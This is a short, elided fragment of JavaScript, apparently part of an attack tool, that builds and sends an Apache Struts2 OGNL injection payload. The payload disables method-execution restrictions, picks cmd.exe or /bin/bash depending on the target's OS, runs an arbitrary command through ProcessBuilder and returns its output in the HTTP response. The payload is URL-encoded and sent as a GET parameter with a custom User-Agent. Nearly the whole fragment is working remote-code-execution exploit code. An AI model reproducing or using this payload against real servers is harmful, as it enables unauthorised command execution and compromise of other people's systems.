...
*/
	...
	{
		var _t = this;
		var s = ('%{#_memberAccess[\'allowStaticMethodAccess\']=true,#context[\'xwork.MethodAccessor.denyMethodExecution\']=false,#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\')'
		...
		ss = encodeURIComponent(ss);
		ss = fnUrlEncode(ss,"'\\/()[].");
		request(fnOptHeader({method: 'GET',uri: url + "?s=" + encodeURIComponent(ss)
		    ,headers:
		    {
		    	"User-Agent": g_szUa,
		    	"Content-Type":"application/x-www-form-urlencoded"
